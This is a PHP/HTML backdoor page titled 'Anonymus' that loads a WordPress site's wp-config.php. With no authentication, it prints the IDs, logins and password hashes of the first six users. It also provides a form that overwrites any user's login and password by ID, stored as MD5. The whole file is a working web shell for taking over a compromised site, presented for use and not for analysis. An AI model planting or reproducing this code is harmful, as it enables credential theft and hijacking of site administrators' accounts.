<!DOCTYPE html>
<html>
   <head>
      <title>Anonymus</title>
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     
   <script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    $('#miboton').on('click', function() {
        $("#central").load('info.php');
        return false;
    });
    ...
});
</script>
   </head>
   <body style="background: black;">
      <div class="pageWrapper">
      <main>
      <section class="thankyouBlock position-relative text-center pt-16 pb-12">
         <div class="container">
            <div class="row">
               <div class="col-12 col-lg-10 offset-lg-1 col-xl-8 offset-xl-2">
                  <header class="header px-xl-1 mb-10 mb-lg-12">
                     <div class="logo mb-8 mb-md-12 mb-lg-18 mx-auto">
                        <img style="width: 40%;" src="https://lh3.googleusercontent.com/proxy/C3pqhUAAIg9RKOUXJ1PfIeFoximi_AwoSxIsXs1O2Acg_KYa_36DuYo8rHDhPVVm_4HMpogg4JEuGag2hdr5SP79phRavrByhotLHqCcZbZq1w7wXFY" class="img-fluid" alt="Montero">
                     </div>
                     <h1>
                        <strong class="d-block fwSemibold" style="color: white;">Anonymus </strong>	
                     </h1>
                     <p>
                        <span class="d-block" style="color: white;">Usuarios y claves de las base de datos</span>
                  </header>
                  <?php 
                     require('../wp-config.php');
                     
                     $ver=$table_prefix."users";
                     $a=md5($_POST['txtpass']);
                     $b=$_POST['txtusers'];
                     
                     global $wpdb;
                     
                     $myrows = $wpdb->get_results( "SELECT * FROM $ver" );
                     
                     echo "<strong style='color:white;'>ID: "."<a style='color:red;'>".$myrows[0]->ID."</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[0]->user_login."</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[0]->user_pass."</a>". "</br> </br>";
                     echo "ID: ". "<a style='color:red;'>".$myrows[1]->ID. "</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[1]->user_login. "</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[1]->user_pass. "</a>". "</br> </br>";
                     echo "ID: ". "<a style='color:red;'>".$myrows[2]->ID. "</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[2]->user_login."</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[2]->user_pass."</a>". "</br> </br>";
                     echo "ID: ". "<a style='color:red;'>".$myrows[3]->ID. "</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[3]->user_login."</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[3]->user_pass."</a>". "</br> </br>";
                     echo "ID: ". "<a style='color:red;'>".$myrows[4]->ID. "</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[4]->user_login."</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[4]->user_pass."</a>". "</br> </br>";
                     echo "ID: ". "<a style='color:red;'>".$myrows[5]->ID. "</a>". "</br>". "Usuario: "."<a style='color:red;'>". $myrows[5]->user_login."</a>". "</br>". "Contrasena: "."<a style='color:red;'>".$myrows[5]->user_pass."</a>". "</br> </br>";
                     
                     $wpdb->update( $ver, 
                      // Datos que se remplazarán
                      array( 
                        'user_pass' => $a,
                        'user_login' => $b,
                      ),
                      // Cuando el ID del campo es igual al número 1
                      array( 'ID' => $_POST['numid'] )
                     );
                     
                      ?>
                  <h3 style="color: red;">Formulario para el cambio de contraseña</h3>
               </div>
            </div>
         </div>
         <center>
            <div class="" style="width: 15%; align-content: center;">
               <form action="info.php" method="POST">
                  <div class="form-group">
                     <label>ID</label>
                     <input type="number" class="form-control" name="numid" placeholder="Ingrese ID del usuario" required>
                  </div>
                  <div class="form-group">
                     <label>Usuario</label>
                     <input type="text" class="form-control" name="txtusers" placeholder="Usuario" required>
                  </div>
                  <div class="form-group">
                     <label>Contraseña</label>
                     <input type="password" class="form-control" name="txtpass" placeholder="Contraseña" required>
                  </div>
                  <button id="miboton" type="submit" value="Actualizar" name="actualizar" class="btn" style="background: red; color: white;">Cambiar contraseña</button>
                  <br>
                  <br>
               </form>
            </div>
         </center>
      </section>
   </body>
</html>
